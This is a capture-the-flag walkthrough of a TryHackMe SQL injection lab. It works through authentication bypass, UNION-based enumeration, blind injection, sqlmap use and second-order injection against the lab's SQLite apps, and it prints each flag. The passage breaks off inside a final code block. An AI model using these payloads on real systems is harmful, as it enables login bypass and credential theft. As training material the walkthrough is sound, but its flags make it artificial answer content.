---
title: SQL Injection Lab
desc: >-
  THM: Understand how SQL injection attacks work and how to exploit this
  vulnerability.
---
## Resources
Following a list of useful resources and cheat sheets related to SQL Injection.

- [PortSwigger - SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [Payload All the Things - SQL Injection](https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/SQL%20Injection/)
- [Websec - SQL Injection](https://websec.ca/kb/sql_injection)
- [HackTricks - SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [OWASP - SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

## Introduction to SQL Injection
This room provides and introduction to SQL injection and demonstrates various SQL Injection attacks.

SQL injection is a technique through which attackers can execute their own malicious SQL statements thereby allowing changes to the backend database or worse theft of personal identifiable information and credentials.

Web applications typically need dynamic SQL queries in order to display content to an end-user. In order to allow dynamic SQL queries, web developers often concatenate user inputs directly into SQL statements. Without sufficient input validation or use of secure coding practices, string concatenation becomes the most common mistake that leads to SQL injection vulnerability.

Take for example the following PHP code which demonstrates a dynamic SQL query in a login form:

```php
$query = "SELECT * FROM users WHERE username='" + $_POST["user"] + "' AND password='" + $_POST["password"]$ + '";"
```
In the above example code, providing the value `' OR 1=1-- -` inside the username parameter can force the database to execute the SQL statement and return all the users in the users table. In essence, the attacker is able to bypass the application's authentication mechanism and is logged in as the first user returned by the query. This is because the addition of the `' OR 1=1--` in the name parameter results in the the following SQL query:

```sql
SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = ''
```
The reason for using `-- -` instead of `--` is primarily because MySQL's double-dash comment style requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, etc.).

### SQL Injection 1: Input Box Non-String
When logging in, the application performs the following query:

```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=10 AND password = 'ce5ca67...'
```
For this challenge, the application accepts user supplied input for profileID as an integer (ie. `profileID=10`). Since inputs by the user are not being sanitized, we can bypass any authentication attempts by injecting a modified query into the profileID field which always returns a TRUE condition (ie. `1 OR 1=1-- -`). The password can be any random string.

![SQL Injection 1: Input Box Non-String](../../assets/images/thm/sqlilab/01%20-%20sqli1%20-%20input%20box%20non-string.png)

<br>

Injecting the malicious payload above allows us to bypass any authentication measures presented by the web application and log in as the first result returned.

![SQL Injection 1: Input Box Non-String Auth Pass](../../assets/images/thm/sqlilab/02%20-%20sqli1%20-%20input%20box%20non-string.png)

<br>

Notice the resultant SQL query. Everything after the `1 OR 1=1-- -` statement is converted into a comment and thereby ignored by the database server when executing the query.

```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=1 OR 1=1-- - AND password = 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb'
```
Retried Flag: `THM{dccea429d73d4a6b4f117ac64724f460}`

### SQL Injection 2: Input Box String
This challenge uses the same query as in the previous challenge however the parameter expects a string instead of an integer (ie. `profileID='10').

Since the query expects a string, we can modify our payload as follows to bypass the authentication mechanism. Again, the password field can be a random value.

```sql
1' OR 1=1-- -
```
![SQLi Injection 2: Input Box String](../../assets/images/thm/sqlilab/03%20-%20sqli2%20-%20input%20box%20string.png)


The executed SQL query is as follows. Notice how everything after the `1' OR 1=1-- -'` statement is converted into a comment and thereby ignored by the SQL server during query execution. Since the password check is not executed due to the modified query, our payload allows us to bypass the authentication check which is normally performed by the backend server.

```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID = '1' OR 1=1-- -' AND password = 'ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb'
```
<br>

![SQLi Injection 2: Input Box String Auth Pass](../../assets/images/thm/sqlilab/04%20-%20sqli2%20-%20input%20box%20string.png)

<br>

Retrieved Flag: `THM{356e9de6016b9ac34e02df99a5f755ba}`

### SQL Injection 3: URL Injection
This challenge implements client-side controls to prevent malicious user inputs from being injected directly into the application via the login form. The JavaScript code below requires both the profileID and the password fields to only contain characters between a-z, A-Z and 0-9. 

```javascript
function validateform() {
    var profileID = document.inputForm.profileID.value;
    var password = document.inputForm.password.value;

    if (/^[a-zA-Z0-9]*$/.test(profileID) == false || /^[a-zA-Z0-9]*$/.test(password) == false) {
        alert("The input fields cannot contain special characters");
        return false;
    }
    if (profileID == null || password == null) {
        alert("The input fields cannot be empty.");
        return false;
    }
}
```
Note that client-side controls are only there to improve the user experience and should not be used as a security feature as the user has full control over the client and data it submits.

Notice how we get an error message when we try to inject a special character into the login form.

![SQL Injection 3: URL Injection Message](../../assets/images/thm/sqlilab/05%20-%20sqli3%20-%20URL%20Injection.png)

Since we can't inject special characters, let's try a random profileID and password to see if we can find another vector. Trying inputs `test:test` results in a message indicating that the account information provided does not exist. However, it looks like the web application is making a GET request to the database server which contains the profileID and password in the URL field.

![SQL Injection 3: URL Injection GET Method](../../assets/images/thm/sqlilab/06%20-%20sqli3%20-%20URL%20Injection.png)

Let's inject our malicious query into the URL.

```url
http://10.10.158.53:5000/sesqli3/login?profileID=test' OR 1=1-- -&password=test
```
The resultant executed query is as follows:

```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='test' OR 1=1-- -' AND password='9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08'
```
Notice once again how everything after the `' OR 1=1-- -` statement is converted into a comment and thereby the password validation is never executed thus allowing us to bypass the authentication check completely.

![SQL Injection 3: URL Injection GET Method Auth Pass](../../assets/images/thm/sqlilab/07%20-%20sqli3%20-%20URL%20injection.png)

<br>

Retrieved Flag: `THM{645eab5d34f81981f5705de54e8a9c36}`

### SQL Injection 4: POST Injection
Similar to the previous challenge, this challenge implements client-side controls to limit the input characters to alpha-numeric thereby preventing direct injection in the login form fields using special characters. Furthermore, unlike the last challenge, this challenge uses the POST method when submitting credentials.

```html
<div class="login-form">
    <form action="/sesqli4/login" onsubmit="return validateform()" name="inputForm" method="POST">
        <h2 class="text-center">Log in</h2>
        <div class="form-group">
            <input type="text" class="form-control" placeholder="ProfileID" required="required" name="profileID">
        </div>
        <div class="form-group">
            <input type="password" class="form-control" placeholder="Password" required="required" name="password">
        </div>
        <div class="form-group">
            <button type="submit" class="btn btn-primary btn-block">Log in</button>
        </div>
    </form>
</div>
```
In this case, we cannot simply inject malicious strings into the login fields or manipulate the URL like in the previous challenge. Since, this challenge uses the POST method to make HTTP requests, we may be able to intercept the request using a proxy like BurpSuite.

Open BurpSuite and ensure Intercept is enabled (don't forget to configure the browser to use the Burp proxy using FoxyProxy!)

![SQL Injection 4: POST Injection Burp](../../assets/images/thm/sqlilab/08%20-%20sqli3%20-%20post%20injection.png)

<br>

![SQL Injection 4: POST Injection Burp Intercept](../../assets/images/thm/sqlilab/09%20-%20sqli3%20-%20post%20injection.png)

<br>

With the request intercepted, modify the profileID to include the malicious statement and forward the request to the server. Ensure to URL encode the modified statement before sending a request (CTRL + u).

![SQL Injection 4: POST Injection Burp Payload](../../assets/images/thm/sqlilab/10%20-%20sqli3%20-%20post%20injection.png)

<br>

Looks like the payload execution was successful as we are able to bypass authentication check as well as the client-side filtering to log in as the first user data retrieved.

![SQL Injection 4: POST Injection Burp Auth Pass](../../assets/images/thm/sqlilab/11%20-%20sqli3%20-%20post%20injection.png)

<br>

The executed query on the back end is as follows.

```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID = 'test' OR 1=1--' AND password = '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08'
```
Retrieved Flag: `THM{727334fd0f0ea1b836a8d443f09dc8eb}`

### SQL Injection 5: UPDATE Statement
Log in using the provided credentials: `10:toor`.

Let's look at the `Edit Profile` page and test if it is vulnerable to SQLi. We are presented with three input fields which can be updated. 

![SQL Injection 5: UPDATE Statement Form](../../assets/images/thm/sqlilab/12%20-%20sqli5%20-%20update%20statement.png)


It is a safe assumption that the application executes an UPDATE query based on the inputs by a user. The most likely form resembles the following.

```sql
UPDATE usertable SET column1='',column2='',column3='' WHERE <Some Condition>
```
In order to test if the Edit Profile application is susceptible to SQLi, we need too figure out the column names. Let's have a look at the source-code for the webpage.

```html
<div class="login-form">
    <form action="/sesqli5/profile" method="post">
        <h2 class="text-center">Edit Francois's Profile Information</h2>
        <div class="form-group">
            <label for="nickName">Nick Name:</label>
            <input type="text" class="form-control" placeholder="Nick Name" id="nickName" name="nickName" value="">
        </div>
        <div class="form-group">
            <label for="email">E-mail:</label>
            <input type="text" class="form-control" placeholder="E-mail" id="email" name="email" value="">
        </div>
        <div class="form-group">
            <label for="password">Password:</label>
            <input type="password" class="form-control" placeholder="Password" id="password" name="password">
        </div>
        <div class="form-group">
            <button type="submit" class="btn btn-primary btn-block">Change</button>
        </div>
        <div class="clearfix">
            <label class="pull-left checkbox-inline"></label>
        </div>
    </form>
</div>
</div>
```
Based on the source-code above, we can reasonable assume that the potential column names are: `nickName`, `email` and `password`.

With this knowledge, we can attempt to test for SQLi vulnerability in the update form. Keeping in mind the UPDATE syntax, let's try injecting the following injecting the following into the Nick Name field.

```sql
',nickName='test',email='email'--
```
The resultant executed query resembles the following. Notice how the `--` converts everything following it to a comment which as a result is not executed.

```sql
UPDATE usertable SET nickName='',nickName='test',email='email'--',email='' WHERE UID='1'
```
With both fields set to their respective values, this confirms both the column names being correct and that SQLi vulnerability exists. Note that we can verify that the E-mail field is also vulnerable in the same way.

![SQL Injection 5: UPDATE Statement Vuln](../../assets/images/thm/sqlilab/13%20-%20sqli5%20-%20update%20statement.png)

Now that we know that the form is vulnerable to SQLi, we can begin enumerating the the database.

First thing we need to identify is what kind of database is in use. We can obtain this information by asking the database to identify itself. As we don't know what kind of database the application is running, we will need to try several.

The following is a list of version statements which can be used to determine database type.

```text
MySQL and MSSQL: @@version
Oracle: SELECT banner FROM v$version
SQLite: sqlite_version()
```
Let's test for MySQL and MSSQL first.

```sql
',nickName=@@version--
```
The fields did not change from their previous values which indicates that the database is not of type MySQL or MSSQL.

Let's test for Oracle.

```sql
',nickName=(SELECT banner FROM v$version)--
```
The fields did not change from their previous values which indicates that the database is not of type Oracle.

Let's try for SQLite.

```sql
',nickName=sqlite_version()--
```
We receive a version `3.22.0` back in the Nick Name field. This implies that we are working with an SQLite version 3.22.0 database.

![SQL Injection 5: UPDATE Statement Database Type](../../assets/images/thm/sqlilab/14%20-%20sqli5%20-%20update%20statement.png)

Now that we know what database we are working with, we can continue with our enumeration. Let's extract all the tables.

```sql
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%')--
```
<br>

![SQL Injection 5: UPDATE Statement Tables](../../assets/images/thm/sqlilab/15%20-%20sqli5%20-%20update%20statement.png)

Looks like we have two tables: `usertable` and `secrets`. Let's extract all the columns in the secrets table.

```sql
',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets')--
```
<br>

![SQL Injection 5: UPDATE Statement Columns](../../assets/images/thm/sqlilab/16%20-%20sqli5%20-%20update%20statement.png)

Let's retrieve the the contents of the secret column.

```sql
',nickName=(SELECT group_concat(secret) FROM secrets)--
```
<br>

![SQL Injection 5: UPDATE Statement Flag](../../assets/images/thm/sqlilab/17%20-%20sqli5%20-%20update%20statement.png)

Retrieve Flag: `THM{b3a540515dbd9847c29cffa1bef1edfb}`

## Vulnerable Startup: Broken Authentication
We can bypass authentication using the techniques we learnt in the previous challenges. This login form appears to use the POST method for making HTTP requests however no client-side filtering of special characters is in place. We can go ahead and try to inject `1' OR 1=1--` to see if we can bypass authentication.

![Vulnerable Startup: Broken Authentication Auth Pass](../../assets/images/thm/sqlilab/18%20-%20vulnerable%20startup%20-%20broken%20authentication.png)

Retrieved Flag: `THM{f35f47dcd9d596f0d3860d14cd4c68ec}`

### Vulnerable Startup: Broken Authentication 2
This challenge builds upon the previous challenge. Our goal here is to find a way to dump all the passwords in the database to retrieve the flag without using blind injection.

Let's attempt authentication bypass using `1' OR 1=1--`. Note that the login form is not enforcing any client-side special character filter.

![Vulnerable Startup: Broken Authentication Auth Pass](../../assets/images/thm/sqlilab/19%20-%20vulnerable%20startup%20-%20broken%20authentication%202.png)

Looks like we are logged in as the `admin` user. Before we can proceed with dumping the passwords, we need to identify locations where the results from the login query are returned within the application.

A possible location to display retrieved data might be the the `Logged in as ...` field in the application. This field appears to show the username once the user is successfully logged in.

![Vulnerable Startup: Broken Authentication Data Retrieve Location 1](../../assets/images/thm/sqlilab/20%20-%20vulnerable%20startup%20-%20broken%20authentication%202.png)

Let's see if we can display some retrieved data in this field. First thing we need to do is to enumerate the number of columns. The authentication form is most likely crafting a query in the background which looks something like this:

```sql
SELECT username FROM users WHERE username = '%username%' AND password = '%password%'
```
We can try enumerating the number of columns using a UNION based attack. Since we don't know the column names, we can use column numbers instead in our enumeration attempts.

```sql
' UNION SELECT 1--
```
If the number of columns are incorrect, the application will throw an `Invalid username or password` error message as the WHERE condition in the SQL query will return a FALSE. A correct number of columns should bypass authentication.

```sql
' UNION SELECT 1,2--
```
<br>

![Vulnerable Startup : Broken Authentication 2 Column Enum](../../assets/images/thm/sqlilab/21%20-%20vulnerable%20startup%20-%20broken%20authentication%202.png)

Looks like the table has two columns. Notice that the username in the `Logged in as` field is replaced by the integer 2 from our UNION SELECT statement. We can leverage this to begin enumerating the database.

Let's begin by figuring out the database type. Similar to one of the challenges above, we can enumerate different database version commands to determine what type of database we are working with.

```text
MySQL and MSSQL: @@version
Oracle: SELECT banner FROM v$version
SQLite: sqlite_version()
```
Let's start with SQLite first as this type of database was used in previous challenges. Inject the following SQL command in the Username field on the login form.

```sql
' UNION SELECT 1,sqlite_version()--
```
<br>

![Vulnerable Startup: Broken Authentication 2 Database Version](../../assets/images/thm/sqlilab/22%20-%20vulnerable%20startup%20-%20broken%20authentication%202.png)

We have successful enumeration of the database version number. This confirms that we are working with SQLite Database Version 3.22.0. With this knowledge, we can begin enumerating the rest of the database schema. Lets continue by retrieving all the table names.

```sql
' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'--
```
<br>

![Vulnerable Startup: Broken Authentication 2 Tables](../../assets/images/thm/sqlilab/23%20-%20vulnerable%20startup%20-%20broken%20authentication%202.png)

It looks like we only have one table named `users`. Let's enumerate all the columns in the `users` table.

```sql
' UNION SELECT 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'--
```
<br>

![Vulnerable Startup: Broken Authentication 2 Columns](../../assets/images/thm/sqlilab/24%20-%20vulnerable%20startup%20-%20broken%20authentication%202.png)

We have successful enumeration of all the columns in the `users` table: `username`, `password`. With this knowledge, we can dump the contents of the columns.

```sql
' UNION SELECT 1,group_concat(username || ":" || password) FROM users--
```
<br>

![Vulnerable Startup: Broken Authentication 2 Data Dump](../../assets/images/thm/sqlilab/25%20-%20vulnerable%20startup%20-%20broken%20authentication%202.png)

We have successfully dumped the contents of the `users` table.

Retrieved Flag: `THM{fb381dfee71ef9c31b93625ad540c9fa}`

### Vulnerable Startup: Broken Authentication 3 (Blind Injection)
In this challenge, we are unable to leverage the username display in the application to extract data from the database. Although the login form has the same vulnerability, we will need to utilize blind SQL injection techniques to retrieve the data.

Content-based (also known as Boolean-based) blind SQL injections rely on the attacker monitoring the response of the web applications. The premise behind content-based blind SQLi is to inject SQL queries which prompt a TRUE or FALSE response for character of the data we are interested in. By discerning differences between a response for an injected query which produces a TRUE result against a response for an injected query which produces a FALSE result, the attacker is able to retrieve data piecewise.

The aim is to extract the password for the user `admin` from the `users` table. We are provided with the respective column names of `username` and `password` which we can leverage without the need to enumerate them. The database type is SQLite.

Before we begin, we need to confirm whether the application is vulnerable to content-based blind SQL injection and evaluate the application's response to TRUE and FALSE queries.

Let's begin by injecting a query which always returns a FALSE.

```sql
admin' AND 1=2--
```
<br>

![Vulnerable Startup: Broken Authentication 2 Blind Injection FALSE](../../assets/images/thm/sqlilab/26%20-%20vulnerable%20startup%20-%20broken%20authentication%203.png)

With the FALSE query, the default response of the web application is to fail authentication and display a message stating `Invalid username or password`.

Let's inject an always TRUE query.

```sql
admin' AND 1=1--
```
<br>

![Vulnerable Startup: Broken Authentication 2 Blind Injection TRUE](../../assets/images/thm/sqlilab/27%20-%20vulnerable%20startup%20-%20broken%20authentication%203.png)

With the TRUE query, the default response of the web application is to bypass authentication and log us in.

Now that we know the default behaviour, let's enumerate the length of the `admin` user's password. We can test the lower bound of the password with the following statement.

```sql
admin' AND LENGTH((SELECT password FROM users WHERE username = 'admin')) > 1--
```
We get a successful login which means that the length of the password is greater than one. Now let's test the upper limit of the password.

```sql
admin' AND LENGTH((SELECT password FROM users WHERE username = 'admin')) > 50--
```
We can know now that the range of the password is somewhere between 1 and 50. We can use BurpSuite's Intruder to iterate through to find the exact length of the password.

Open BurpSuite and and turn on *Intercept* (ensure that the browser is proxying through BurpSuite).

![Vulnerable Startup: Broken Authentication 3 Blind Injection BurpSuite Intercept](../../assets/images/thm/sqlilab/28%20-%20vulnerable%20startup%20-%20broken%20authentication%203.png)

Send the intercepted request to *Intruder* and *Clear* all payload markers. Highlight the new payload marker (in our case it is the integer length of the password) and click *Add* to insert the new payload marker.

![Vulnerable Startup: Broken Authentication 3 Blind Injection BurpSuite Intruder](../../assets/images/thm/sqlilab/29%20-%20vulnerable%20startup%20-%20broken%20authentication%203.png)

Select the *Payloads* tab on the top and under *Payload Sets* select *Payload Types --> Numbers*. Configure the range to be from 1 to 50 with an increment of 1. Press *Start Attack* to begin the iterative attack.

![Vulnerable Startup: Broken Authentication 3 Blind Injection BurpSuite Intruder Payload](../../assets/images/thm/sqlilab/30%20-%20vulnerable%20startup%20-%20broken%20authentication%203.png)

BurpSuite Intruder can take some time in the Community Edition so we will need to be patient. Once the attack is complete, we can look at the results. We expect an HTTP 302 redirect when the right length of the password is guessed.

![Vulnerable Startup: Broken Authentication 3 Blind Injection BurpSuite Intruder Results](../../assets/images/thm/sqlilab/31%20-%20vulnerable%20startup%20-%20broken%20authentication%203.png)

We have successfully enumerated the password length (37) of the `admin` user. To verify, we can test the length with the query above to see if we get successful login which we do.

With this knowledge, we can start retrieving the passwords in a piecewise manner. In order to do this, we will leverage SQLite's [substr](https://sqlite.org/lang_corefunc.html#substr) function.

```sql
SUBSTR(string, <start>, <length>)
```
Our injected query will resemble something like the following.

```sql
admin' AND SUBSTR((SELECT password FROM users WHERE username = 'admin'),1,1) = 'X'
```
Note that we are told in the challenge that the application converts the user input to lowercase which complicates our approach as `X` is not the same as `x` when comparing password strings. We can circumvent this by injecting our characters as hex representation via the substitution type [X](https://www.sqlite.org/printf.html#substitution_types) and then using SQLite's [CAST](https://sqlite.org/lang_expr.html#castexpr) expression to convert the value to the datatype the database expects. Our injected query would look something like the following.

```sql
admin' AND SUBSTR((SELECT password FROM users WHERE username = 'admin'),1,1) = CAST(X'54' as Text)--
```
Where `54` is hex representation of ASCII *T* (0x54). We can iterate through the different permutations manually (which is very time consuming) or using BurpSuite Intruder (which also can take a significant amount of time when using the Community Edition).

Instead of manual enumeration or using BurpSuite, we can also use a tool called *sqlmap* which automates the process of detecting and exploiting SQL injection flaws. We can use the following command to exploit the SQLi vulnerability in the username field and dump all the passwords related to this challenge.

```console
$ sqlmap -u http://10.10.202.208:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --threads=10 --dump
```
<br>

![Vulnerable Startup: Broken Authentication 3 Blind Injection sqlmap](../../assets/images/thm/sqlilab/32%20-%20vulnerable%20startup%20-%20broken%20authentication%203.png)

Retrieved Flag: `THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}`

### Vulnerable Startup: Vulnerable Notes
In this challenge, the previous vulnerability related to the login function has been fixed. A new note function has been added which allows a user to add notes on their page.

Let's begin by exploring the new note functionality added by the developers. Since the login form is not longer vulnerable to SQLi, we will need to create a dummy account to permit recon. It looks like the login form is using parameterized queries to prevent inputs from leading to SQL injection.

![Vulnerable Startup: Vulnerable Notes](../../assets/images/thm/sqlilab/33%20-%20vulnerable%20startup%20-%20vulnerable%20notes.png)

We can test to see the input fields in the Notes form are vulnerable to SQLi.

![Vulnerable Startup: Vulnerable Notes SQLi](../../assets/images/thm/sqlilab/34%20-%20vulnerable%20startup%20-%20vulnerable%20notes.png)

The input fields don't appear to be vulnerable (form is most likely using parameterized queries as well) however input sanitization does not appear to be implemented. This means that the server will accept malicious data and place it in the database since the application does not sanitize it.

Based on this knowledge, we can infer that parameterized queries are implemented for all input fields but input sanitization is not implemented globally. Let's see what happens if we create an account with a malicious username.

```sql
' UNION SELECT 1,2--
```
Creating and logging in with the username above indicates that while parameterized queries may be used in all input fields, the function which retrieves the notes for a particular user does not appear to use parameterized queries. Our malicious username appears to be directly concatenated into the SQL query making it the function vulnerable to SQL injection.

![Vulnerable Startup: Vulnerable Notes SQLi Success](../../assets/images/thm/sqlilab/35%20-%20vulnerable%20startup%20-%20vulnerable%20notes.png)

The first column holds data from the `Title` field while the second column holds data from the `Note` field. On a side note, a username with incorrect column numbers displays no notes. With this knowledge, we can start enumerating the database. As the table is based on the same challenge as the last one, it is safe to assume that we are dealing with SQLite.

Let's begin by enumerating the tables in the database by creating the following username.

```sql
' UNION SELECT 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%'--
```
<br>

![Vulnerable Startup: Vulnerable Notes SQLi Tables](../../assets/images/thm/sqlilab/36%20-%20vulnerable%20startup%20-%20vulnerable%20notes.png)

Let's enumerate columns from the `users` table by creating the following username.

```sql
' UNION SELECT 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'--
```
<br>

![Vulnerable Startup: Vulnerable Notes SQLi Columns](../../assets/images/thm/sqlilab/37%20-%20vulnerable%20startup%20-%20vulnerable%20notes.png)

Now that we know the columns, we can go ahead and extract the usernames and passwords from the table by creating the following username.

```sql
' UNION SELECT 1,group_concat(username || ":" || password) FROM users--
```
<br>

![Vulnerable Startup: Vulnerable Notes SQLi Data Dump](../../assets/images/thm/sqlilab/38%20-%20vulnerable%20startup%20-%20vulnerable%20notes.png)

Retrieved Flag: `THM{4644c7e157fd5498e7e4026c89650814}`

Note that we can also solve this challenge using sqlimap and a tamper script. For more information refer to [SQL Injection Lab](https://tryhackme.com/room/sqlilab) room on THM.

### Vulnerable Startup: Change Password
For this challenge, the vulnerability on the Notes form has been fixed. The devs have implemented new functionality to allow a user to change their password by navigating to the Profile page. The goal of this challenge is to log into the `admin` account in order to retrieve the flag.

It is not uncommon for password change functionality to be implement using UPDATE SQL statements. Typically, a developer would ensure that parameterized queries are used for all input fields such as username and passwords along with input sanitization.

A poorly implemented SQL query for a password change functionality would look something like the following.

```sql
SELECT username, password FROM users WHERE id =?;
UPDATE users SET password = ? WHERE username = '" + username +"';
```
In the above queries, both the  id and password field uses parameterized query. The second query, however, directly concatenates the username to the statement. The assumption some developers make is that since the username does not come directly from an input in the password change form but is rather fetched from the database based on the user id stored in the session object, additional precautions do not need to be taken. An attacker can leverage this oversight by crafting malicious usernames which allows changing the password of a different user (ie. admin).

Let's begin by creating a malicious username in hopes that the username is directly concatenated into a query similar to the example above.

```sql
admin'--
```
<br>

![Vulnerable Startup: Change Password User](../../assets/images/thm/sqlilab/39%20-%20vulnerable%20startup%20-%20change%20password.png)

We can see from the above image that input sanitation is not implemented. Let's see if the developer implemented unsafe functionality as described above. With our malicious username, the above SQL queries would result in the following.

```sql
SELECT username, password FROM users WHERE id =?;
UPDATE users SET password = ? WHERE username = 'admin'--';
```
Note how the executed query would result in a password change for the `admin` user rather than our malicious `admin'--` user. Let's see if this works in practice.

Go to the Profile page and change the password to `testpass` for our malicious username.

![Vulnerable Startup: Password Change](../../assets/images/thm/sqlilab/40%20-%20vulnerable%20startup%20-%20change%20password.png)

Let's see if our assumption is correct and try logging in using the following credentials: `admin:testpass`.

![Vulnerable Startup: Password Change Successful Login](../../assets/images/thm/sqlilab/41%20-%20vulnerable%20startup%20-%20change%20password.png)

Looks like we were successful in changing the administrator user's password.

Retrieved Flag: `THM{cd5c4f197d708fda06979f13d8081013}`

### Vulnerable Startup: Book Title
In this challenge, we will be looking at a vulnerable search functionality added to the web application. Based on the information provided by the developer, the application concatenates the user input directly into the SQL statement. The gaol of this challenge is to abuse this vulnerability and find the hidden flag.

Let's begin by creating a temporary account and log in so that we can test the functionality. It looks like the web application makes a GET request everything a search for a book title is made and displays the results in the web application.

![Vulnerable Startup: Book Title GET](../../assets/images/thm/sqlilab/42%20-%20vulnerable%20startup%20-%20book%20title.png)

![Vulnerable Startup: Book Title Search](../../assets/images/thm/sqlilab/43%20-%20vulnerable%20startup%20-%20book%20title.png)

Based on developer's notes, the backend makes the following query when a search is made.

```sql
SELECT * from books WHERE id = (SELECT id FROM books WHERE title like '" + title + "%')
```
The above query is vulnerable to SQLi as any input into the search field is concatenated directly into the query. Let's inject the following input and see what happens.

```sql
') OR 1=1--
```
The above statement converts the search statement into the following always TRUE statement.

```sql
SELECT * from books WHERE id = (SELECT id FROM books WHERE title like '') OR 1=1--'')
```
<br>

![Vulnerable Startup: Book Title Dump](../../assets/images/thm/sqlilab/44%20-%20vulnerable%20startup%20-%20book%20title.png)

Looks like we get a full dump of the book titles in the database. With this knowledge, we can attempy UNION based attacks and attempt to enumerate and extract the credentials. As with previous challenges, the database is built upon SQLite so we will proceed with this in mind.

Let's begin by first enumerating the number of columns in the table. Just by looking at the full dump of the book titles, we can infer the number of columns. There are columns reserved for the title of the book, description, author and some sort of an integer id identifier. So let's test to see if 4 columns is the correct number. 

```sql
') UNION SELECT 1,2,3,4--
```
<br>

![Vulnerable Startup: Book Title Column Numbers](../../assets/images/thm/sqlilab/45%20-%20vulnerable%20startup%20-%20book%20title.png)

Looks like our inference was correct and the table in question has 4 columns. Let's proceed with enumerating the tables in the database.

```sql
') UNION SELECT 1,2,3,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%'--
```
<br>

![Vulnerable Startup: Book Title Tables](../../assets/images/thm/sqlilab/46%20-%20vulnerable%20startup%20-%20book%20title.png)

The table we are interested in the `users` table. Enumerate the columns from the table.

```sql
') UNION SELECT 1,2,3,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'--
```
<br>

![Vulnerable Startup: Book Title Users Columns](../../assets/images/thm/sqlilab/47%20-%20vulnerable%20startup%20-%20book%20title.png)

Let's extract the credentials.

```sql
') UNION SELECT 1,2,3,group_concat(username || ":" || password) FROM users--
```
<br>

![Vulnerable Startup: Book Title Credentials](../../assets/images/thm/sqlilab/48%20-%20vulnerable%20startup%20-%20book%20title.png)

Retrieved Flag: `THM{27f8f7ce3c05ca8d6553bc5948a89210}`

### Vulnerable Startup: Book Title 2
In this challenge, the web application uses the results of one query in to an other without properly sanitizing the data. Both queries are vulnerable as the first query can be exploited through blind SQL injection. However, since the second query is also vulnerable, we can simplify the exploitation and use UNION based injection instead of Boolean-based blind injection. The goal of this task is to exploit the vulnerability without using blind SQL injection and retrieve the credentials.

Based on developer's notes provided, the backend queries excluded look like the following.

```python
bid = db.sql_query(f"SELECT id FROM books WHERE title like '{title}%'", one=True)
if bid:
    query = f"SELECT * FROM books WHERE id = '{bid['id']}'"
```
Here, the first query retrieves the ID of the book while second query retrieves the data associated with the ID from the first query. We can exploit this crafting a malicious input for the first query which will then be executed by the second.

By injecting:

```sql
' UNION SELECT 'test
```
We should get a resultant executed query of:

```sql
SELECT id FROM books WHERE title like 'test%';
SELECT * FROM books WHERE id = 'test%';
```
If we are able to guess an ID which exists in the database, we may be able confirm UNION based injection. Let's try an ID of 1.

```sql
' UNION SELECT '1'--
```
This should give a resultant executed query of:

```sql
SELECT id FROM books WHERE title like '' UNION SELECT '1'--%';
SELECT * FROM books WHERE id = '1';
```
<br>

![Vulnerable Startup: Book Title 2 SQLi](../../assets/images/thm/sqlilab/49%20-%20vulnerable%20startup%20-%20book%20title%202.png)

Looks like we have success with our guess. Since we know that our malicious input from the first query is being passed unsanitized to the second query, we can begin enumerating the database. First step is to figure out the number of columns in the current table.

In order to confirm the number of columns in the database, we need the second query to execute the following query.

```sql
SELECT * FROM books WHERE id = '' UNION SELECT 1,2,...
```
We will need to work backwards. Say we inject the following:

```sql
' UNION SELECT '1' UNION SELECT 1,2,3,4--
```
The resultant executed queries would look like the following.

```sql
SELECT id FROM books WHERE title like '' UNION SELECT '1' UNION SELECT 1,2,3,4--%';
SELECT * FROM books WHERE id = '1 UNION SELECT 1,2,3,4--%';
```
This breaks the query and thus nothing get's executed. This happens because  our original injected input closes the string that is supposed to be returned by appending the single quote before the second UNION clause. In order to fix this syntax issue, we will need to escape the single quote.

```sql
' UNION SELECT '1'' UNION SELECT 1,2,3,4--
```
Escaping the appended single quote before the second UNION statement should result in the following executed query.

```sql
SELECT id FROM books WHERE title like '' UNION SELECT '1'' UNION SELECT 1,2,3,4--%';
SELECT * FROM books WHERE id = '1' UNION SELECT 1,2,3,4--%';
```
<br>

![Vulnerable Startup: Book Title 2 Second Query Injection](../../assets/images/thm/sqlilab/50%20-%20vulnerable%20startup%20-%20book%20title%202.png)

Looks like we have success. Let's go ahead and modify our payload so it returns an invalid record to make things clearer.

```sql
' UNION SELECT '-1'' UNION SELECT 1,2,3,4--
```
<br>

![Vulnerable Startup: Book Title 2 Columns](../../assets/images/thm/sqlilab/51%20-%20vulnerable%20startup%20-%20book%20title%202.png)

Like the previous challenge, the credentials are stored in the `users` table under the columns `username` and `password`. Let's go ahead and extract them and finish the challenge.

```sql
